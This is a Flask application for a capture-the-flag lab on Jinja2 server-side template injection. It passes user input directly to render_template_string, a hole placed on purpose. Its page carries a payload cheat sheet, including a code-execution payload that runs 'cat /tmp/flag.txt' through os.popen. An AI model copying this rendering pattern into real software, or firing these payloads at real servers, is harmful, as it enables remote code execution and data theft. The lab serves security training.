from flask import Flask, request, render_template_string
import os

app = Flask(__name__)
FLAG = os.environ.get("FLAG", "CTF{55t1_j1nj42_rce_pyth0n_s4ndb0x_3sc4p3}")

# Save flag to disk as well
with open('/tmp/flag.txt', 'w') as f:
    f.write(FLAG + "\n")

HTML_LAYOUT = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DynamicRender - Jinja2 Template Studio</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;800&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-dark: #0b0f19;
            --card-bg: #111827;
            --border: #1f2937;
            --accent: #f59e0b;
            --accent-glow: rgba(245, 158, 11, 0.25);
            --text-main: #f3f4f6;
            --text-dim: #9ca3af;
            --success: #10b981;
            --danger: #ef4444;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            background-color: var(--bg-dark);
            color: var(--text-main);
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        header {
            border-bottom: 1px solid var(--border);
            padding: 1.25rem 2rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: rgba(17, 24, 39, 0.9);
            backdrop-filter: blur(10px);
        }
        .brand {
            font-family: 'JetBrains Mono', monospace;
            font-size: 1.25rem;
            font-weight: 800;
            color: var(--accent);
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        .container {
            max-width: 1000px;
            margin: 2.5rem auto;
            padding: 0 1rem;
            flex: 1;
            width: 100%;
        }
        .card {
            background: var(--card-bg);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 2rem;
            box-shadow: 0 15px 35px -10px rgba(0,0,0,0.6);
            margin-bottom: 2rem;
        }
        .banner-challenge {
            background: linear-gradient(135deg, rgba(245, 158, 11, 0.1), rgba(239, 68, 68, 0.05));
            border: 1px solid var(--accent);
            padding: 1rem 1.5rem;
            border-radius: 8px;
            margin-bottom: 1.5rem;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.85rem;
        }
        textarea, button {
            padding: 0.85rem 1.25rem;
            border-radius: 8px;
            border: 1px solid var(--border);
            background: #080c16;
            color: #fff;
            font-family: inherit;
            font-size: 0.95rem;
        }
        textarea { font-family: 'JetBrains Mono', monospace; }
        textarea:focus { outline: none; border-color: var(--accent); box-shadow: 0 0 12px var(--accent-glow); }
        button {
            background: var(--accent);
            color: #0b0f19;
            font-weight: 700;
            cursor: pointer;
            border: none;
            transition: all 0.2s;
        }
        button:hover { transform: translateY(-2px); box-shadow: 0 5px 18px var(--accent-glow); }
        .rendered-box {
            background: #050811;
            padding: 1.25rem;
            border-radius: 8px;
            border: 1px solid #1e293b;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.9rem;
            color: #fde68a;
            white-space: pre-wrap;
            word-break: break-all;
            margin-top: 1rem;
        }
        .hints-box {
            background: #090e1a;
            border-left: 4px solid var(--accent);
            padding: 1rem 1.25rem;
            border-radius: 0 8px 8px 0;
            font-size: 0.85rem;
            color: var(--text-dim);
            margin-top: 1.5rem;
        }
        .hints-box code { color: #38bdf8; font-family: 'JetBrains Mono', monospace; }
        footer {
            text-align: center;
            padding: 1.5rem;
            color: var(--text-dim);
            font-size: 0.8rem;
            border-top: 1px solid var(--border);
        }
    </style>
</head>
<body>
    <header>
        <div class="brand">
            <span>🔥</span> SSTI TEMPLATER // JINJA2 INJECTION LAB
        </div>
        <div style="font-size: 0.85rem; color: var(--text-dim); font-family: 'JetBrains Mono', monospace;">
            OWASP Top 10: A03 Injection (SSTI / RCE)
        </div>
    </header>
    <div class="container">
        <div class="banner-challenge">
            <span>🎯 OBJECTIVE:</span> Exploit Server-Side Template Injection (SSTI) in the live Jinja2 template previewer to inspect Python global classes, bypass MRO restrictions, and read the secret flag stored in <code>/tmp/flag.txt</code> or environment variables!
        </div>

        <div class="card">
            <h2 style="color: #fff; margin-bottom: 0.5rem;">Live Jinja2 Dynamic Template Engine</h2>
            <p style="color: var(--text-dim); margin-bottom: 1.5rem;">Enter a template snippet with expressions like <code>{{ 7 * 7 }}</code> or custom filters.</p>
            
            <form method="POST" action="/" style="display: flex; flex-direction: column; gap: 1rem;">
                <textarea name="template_input" rows="4" placeholder="Hello {{ name }}! Today is {{ date }}..." required>{{ template_input }}</textarea>
                <div>
                    <button type="submit">Compile & Render Template</button>
                </div>
            </form>

            {% if rendered_output is not none %}
            <div style="margin-top: 2rem;">
                <h4 style="color: #fff; margin-bottom: 0.5rem;">Rendered Engine Output:</h4>
                <div class="rendered-box">{{ rendered_output }}</div>
            </div>
            {% endif %}

            <div class="hints-box">
                <strong>💡 SSTI Exploitation Payloads & Cheat Sheet:</strong>
                <ul style="margin-left: 1.5rem; margin-top: 0.5rem; line-height: 1.6;">
                    <li>Math evaluation probe: <code>{{ 7 * 7 }}</code> (should return <code>49</code>)</li>
                    <li>Config inspection: <code>{{ config.items() }}</code></li>
                    <li>Python MRO subclass traversal: <code>{{ ''.__class__.__mro__[1].__subclasses__() }}</code></li>
                    <li>File read via <code>os._wrap_close</code> or subprocess: <code>{{ cycler.__init__.__globals__.os.popen('cat /tmp/flag.txt').read() }}</code></li>
                </ul>
            </div>
        </div>
    </div>
    <footer>
        Cybersecurity Training Lab Environment • CTF Challenge: Server-Side Template Injection
    </footer>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def index():
    template_input = request.form.get('template_input', 'Welcome to the {{ "Dynamic" }} Security Sandbox!') if request.method == 'POST' else 'Welcome to {{ "CyberSec" }} Jinja2 Portal!'
    rendered_output = None
    
    if request.method == 'POST':
        try:
            # VULNERABILITY: Directly rendering unvalidated user string as Jinja2 template
            rendered_output = render_template_string(template_input)
        except Exception as e:
            rendered_output = f"Template Syntax / Execution Error: {str(e)}"
            
    return render_template_string(HTML_LAYOUT, template_input=template_input, rendered_output=rendered_output)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
